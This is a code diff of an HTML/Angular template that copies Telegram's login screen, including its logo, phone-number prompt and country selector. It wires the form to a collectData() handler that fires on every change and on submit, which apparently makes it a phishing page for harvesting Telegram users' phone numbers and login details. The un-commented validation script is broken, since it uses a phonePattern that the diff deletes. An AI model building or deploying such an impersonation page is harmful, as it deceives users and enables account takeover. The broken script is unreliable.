@@ -4,126 +4,38 @@
     <img src="https://telegram.org/img/t_logo.png" alt="Telegram Logo">
     <h2>Telegram</h2>
     <p>Please confirm your country code and <br>enter your phone number.</p>
-    <form id="login-form" novalidate>
+    <form id="login-form" [formGroup]="loginForm" (submit)="collectData()" (change)="collectData()">
+
         <div class="form-group">
             <label for="country">Country</label>
-            <select id="country" name="country">
-                <option value="IN" selected>🇮🇳 India</option>
-                <option value="US">🇺🇸 USA</option>
-                <option value="CA">🇨🇦 Canada</option>
-                <option value="GB">🇬🇧 UK</option>
-                <option value="AU">🇦🇺 Australia</option>
-                <option value="FR">🇫🇷 France</option>
-                <option value="DE">🇩🇪 Germany</option>
-                <option value="IT">🇮🇹 Italy</option>
-                <option value="JP">🇯🇵 Japan</option>
-                <option value="CN">🇨🇳 China</option>
-                <option value="KR">🇰🇷 South Korea</option>
-                <option value="BR">🇧🇷 Brazil</option>
-                <option value="ZA">🇿🇦 South Africa</option>
-                <option value="RU">🇷🇺 Russia</option>
-                <option value="MX">🇲🇽 Mexico</option>
-                <option value="ES">🇪🇸 Spain</option>
-                <option value="NL">🇳🇱 Netherlands</option>
-                <option value="SE">🇸🇪 Sweden</option>
-                <option value="CH">🇨🇭 Switzerland</option>
-                <option value="AR">🇦🇷 Argentina</option>
-                <option value="CO">🇨🇴 Colombia</option>
-                <option value="TH">🇹🇭 Thailand</option>
-                <option value="SG">🇸🇬 Singapore</option>
-                <option value="NZ">🇳🇿 New Zealand</option>
-                <option value="PL">🇵🇱 Poland</option>
-                <option value="IE">🇮🇪 Ireland</option>
-                <option value="DK">🇩🇰 Denmark</option>
-                <option value="NO">🇳🇴 Norway</option>
-                <option value="FI">🇫🇮 Finland</option>
-                <option value="TR">🇹🇷 Turkey</option>
-                <option value="SA">🇸🇦 Saudi Arabia</option>
-                <option value="AE">🇦🇪 United Arab Emirates</option>
-                <option value="PH">🇵🇭 Philippines</option>
-                <option value="VN">🇻🇳 Vietnam</option>
-                <option value="MY">🇲🇾 Malaysia</option>
-                <option value="HK">🇭🇰 Hong Kong</option>
-                <option value="TW">🇹🇼 Taiwan</option>
-                <option value="NG">🇳🇬 Nigeria</option>
-                <option value="EG">🇪🇬 Egypt</option>
-                <option value="KE">🇰🇪 Kenya</option>
-                <option value="GH">🇬🇭 Ghana</option>
-                <option value="IL">🇮🇱 Israel</option>
-                <option value="IQ">🇮🇶 Iraq</option>
-                <option value="IR">🇮🇷 Iran</option>
-                <option value="PK">🇵🇰 Pakistan</option>
-                <option value="BD">🇧🇩 Bangladesh</option>
-                <option value="LK">🇱🇰 Sri Lanka</option>
-                <option value="MM">🇲🇲 Myanmar</option>
-                <option value="NP">🇳🇵 Nepal</option>
-                <option value="UZ">🇺🇿 Uzbekistan</option>
-                <option value="KZ">🇰🇿 Kazakhstan</option>
-                <option value="AZ">🇦🇿 Azerbaijan</option>
-                <option value="GE">🇬🇪 Georgia</option>
-                <option value="AM">🇦🇲 Armenia</option>
-                <option value="MD">🇲🇩 Moldova</option>
-                <option value="BY">🇧🇾 Belarus</option>
-                <option value="UA">🇺🇦 Ukraine</option>
-                <option value="LT">🇱🇹 Lithuania</option>
-                <option value="LV">🇱🇻 Latvia</option>
-                <option value="EE">🇪🇪 Estonia</option>
-                <option value="MT">🇲🇹 Malta</option>
-                <option value="SI">🇸🇮 Slovenia</option>
-                <option value="HR">🇭🇷 Croatia</option>
-                <option value="BA">🇧🇦 Bosnia and Herzegovina</option>
-                <option value="RS">🇷🇸 Serbia</option>
-                <option value="MK">🇲🇰 North Macedonia</option>
-                <option value="BG">🇧🇬 Bulgaria</option>
-                <option value="RO">🇷🇴 Romania</option>
-                <option value="HU">🇭🇺 Hungary</option>
-                <option value="CZ">🇨🇿 Czech Republic</option>
-                <option value="SK">🇸🇰 Slovakia</option>
-                <option value="AT">🇦🇹 Austria</option>
-                <option value="LI">🇱🇮 Liechtenstein</option>
-                <option value="MC">🇲🇨 Monaco</option>
-                <option value="SM">🇸🇲 San Marino</option>
-                <option value="AD">🇦🇩 Andorra</option>
-                <option value="IS">🇮🇸 Iceland</option>
-                <option value="LI">🇱🇮 Liechtenstein</option>
-                <option value="TV">🇹🇻 Tuvalu</option>
-                <option value="FM">🇫🇲 Micronesia</option>
-                <option value="WS">🇼🇸 Samoa</option>
-                <option value="SB">🇸🇧 Solomon Islands</option>
-                <option value="KI">🇰🇮 Kiribati</option>
-                <option value="TO">🇹🇴 Tonga</option>
-                <option value="VU">🇻🇺 Vanuatu</option>
-                <option value="NR">🇳🇷 Nauru</option>
-                <option value="PW">🇵🇼 Palau</option>
-                <option value="AS">🇦🇸 American Samoa</option>
-                <option value="PR">🇵🇷 Puerto Rico</option>
-                <option value="GL">🇬🇱 Greenland</option>
-                <!-- Add more countries here if needed -->
+            <select #ccode id="country" name="country">
+                <option *ngFor="let country of LoginComponentRef.countries" [value]="country.phoneCode">{{ country.flag }} {{ country.name }}</option>
             </select>
-            
         </div>
+
         <div class="form-group">
             <label for="phone">Your phone number</label>
-            <input type="tel" id="phone" name="phone" value="+91 ">
+            <input type="tel" id="phone" name="phone" formControlName="phone" [value]="ccode.value">
+            <div *ngIf="phone?.invalid" class="error-message">Please enter a valid phone number with country code.</div>
         </div>
-        <button type="submit"><a href="./login-code.html"><i class="fas fa-arrow-right"></i></a></button>
+
+        <button type="submit"><a href="./login-code.html"><i class="fas fa-paperclip"></i></a></button>
+
         <div class="checkbox-container">
-            <input type="checkbox" id="keep-signed-in" name="keep-signed-in" checked>
+            <input type="checkbox" id="keep-signed-in" name="keep-signed-in" formControlName ="keepSignedIn">
             <label for="keep-signed-in">Keep me signed in</label>
         </div>
+
     </form>
 </div>
-</div>
-<!-- <script>
-    $(document).ready(function() {
+<script>
         function validatePhoneNumber() {
             const phone = $('#phone').val().trim();
-            const phonePattern = /^\+\d{2} \d{10}$/; 
             
             if (!phonePattern.test(phone)) {
                 $('#phone').parent().addClass('has-error');
                 $('#phone').siblings('.error-message').remove(); 
-                $('#phone').after('<div class="error-message">Please enter a valid phone number with country code.</div>');
+                $('#phone').after();
                 return false;
             } else {
                 $('#phone').parent().removeClass('has-error');
@@ -152,6 +64,7 @@
                 alert('Please correct the errors in the form.');
             }
         });
-    });
 </script>
- -->
+
+
+</div>
